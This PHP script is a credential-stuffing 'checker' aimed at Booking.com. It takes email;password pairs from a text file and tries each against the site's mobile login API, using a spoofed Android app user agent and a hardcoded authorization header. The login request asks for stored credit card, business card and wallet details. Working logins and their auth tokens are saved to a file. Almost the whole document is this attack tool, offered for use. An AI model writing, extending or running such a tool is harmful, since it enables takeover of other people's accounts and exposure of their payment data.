<?php
/**	
 * @author eco.nxn
 */
date_default_timezone_set("Asia/Jakarta");
error_reporting(0);
class curl {
	private $ch, $result, $error;
	
	/**	
	 * HTTP request
	 * 
	 * @param string $method HTTP request method
	 * @param string $url API request URL
	 * @param array $param API request data
     * @param array $header API request header
	 */
	public function request ($method, $url, $param, $header) {
		curl:
        $this->ch = curl_init();
        switch ($method){
            case "GET":
                curl_setopt($this->ch, CURLOPT_POST, false);
                break;
            case "POST":               
                curl_setopt($this->ch, CURLOPT_POST, true);
                curl_setopt($this->ch, CURLOPT_POSTFIELDS, $param);
                break;
            case "PATCH":               
                curl_setopt($this->ch, CURLOPT_CUSTOMREQUEST, "PATCH");
                curl_setopt($this->ch, CURLOPT_POSTFIELDS, $param); 
                break;
        }
        curl_setopt($this->ch, CURLOPT_URL, $url);
        curl_setopt($this->ch, CURLOPT_USERAGENT, 'Booking.App/22.9 Android/9; Type: mobile; AppStore: google; Brand: xiaomi; Model: Redmi Note 8;');
        curl_setopt($this->ch, CURLOPT_HEADER, false);
        curl_setopt($this->ch, CURLOPT_HTTPHEADER, $header);
        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($this->ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($this->ch, CURLOPT_TIMEOUT, 20);
        $this->result = curl_exec($this->ch);
        $this->error = curl_error($this->ch);
        if($this->error) {
            echo "(!) Connection Timeout\n";
            sleep(3);
            goto curl;
        }
        curl_close($this->ch);
        return $this->result;
    }   
}

class bookingcom extends curl{

    function uuid(){
        $data = random_bytes(16);
        $data[6] = chr(ord($data[6]) & 0x0f | 0x40); 
        $data[8] = chr(ord($data[8]) & 0x3f | 0x80); 
        return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
    }

    function check($email, $password, $device_id, $header) { 

        $method   = 'POST';
        $header[] = 'Content-Type: application/x-gzip; contains="application/json"; charset=utf-8';

        $endpoint = 'https://secure-iphone-xml.booking.com/json/mobile.login?&user_os=9&user_version=22.9-android&device_id='.$device_id.'&network_type=wifi&languagecode=en-us&display=normal_xxhdpi&affiliate_id=337862 ';
        
        $param = '{
            "email": "'.$email.'",
            "password": "'.$password.'",
            "dwim": 1,
            "include_newsletter_subscription_data": "1",
            "include_rewards_wallet_info": "1",
            "include_google_state": "1",
            "include_cc_details": "1",
            "include_business_cc_info": "1",
            "include_all_ccs": "1",
            "include_business_data": "1",
            "include_assistant_language_code": "1",
            "detailed_genius_status": "1",
            "include_bad_booker_info": "1",
            "include_bbtool_info": "1",
            "cc_detail_level": "1",
            "include_email_data": "1",
            "preferred_travel_purpose": "1",
            "include_identity_users": "1"
        }';
        
        $check = $this->request ($method, $endpoint, $param, $header);

        $json = json_decode($check);
 
        if(isset($json->auth_token)) { 

            $file = dirname(__FILE__)."/akun_valid.txt";
            if(file_exists($file)) {
                unlink($file);
            }

            $fh = fopen($file, "a");
            fwrite($fh, $email.";".$password.";token_".$json->auth_token.";device_id_".$device_id);
            fclose($fh);

            if($json->profile->email_data[0]->email_verified == 0) { 
                return "Sukses Login ".$email.". Email Verified: FALSE\n";
            } else {
                return "Sukses Login ".$email.". Email Verified: TRUE\n";
            }
            
        } else {
            return "Error [".$json->code."] ".$json->message."\n"; 
        }         
    }
}

/**
 * Running
 */
// style 
echo "\n"; 
echo "   ___   ____   _____ ____   __  ___\n";
echo "  / _ ) / __ \ / ___// __ \ /  |/  /\n";
echo " / _  |/ /_/ // /__ / /_/ // /|_/ /\n"; 
echo "/____/ \____/ \___/ \____//_/  /_/\n";  
echo "Checker               by @eco.nxn\n";
start:
echo "\nPut your account in akun.txt (format: email;password)\n";

$bocom = new bookingcom();

$header[] = 'X-LIBRARY: okhttp+network-api';
$header[] = 'Authorization: Basic dGhlc2FpbnRzYnY6ZGdDVnlhcXZCeGdN';
$header[] = 'X-Booking-API-Version: 1';
$header[] = 'Host: secure-iphone-xml.booking.com';

echo "Enter...";
trim(fgets(STDIN));

$file = dirname(__FILE__)."/akun.txt";

if(file_exists($file)) {
    $list = explode("\n",str_replace("\r","",file_get_contents($file)));
    
    $no=1;
    foreach ($list as $value) {

        $account = explode(";", $value);
        $email     = $account[0];
        $password  = $account[1];
        $device_id = $bocom->uuid();
        
        $check = $bocom->check($email, $password, $device_id, $header);

        echo "[".$no++."] ".$check;
    }

    echo "\n(i) Your valid account has saved in akun_valid.txt\n\n";
    

} else {
    goto start;
}

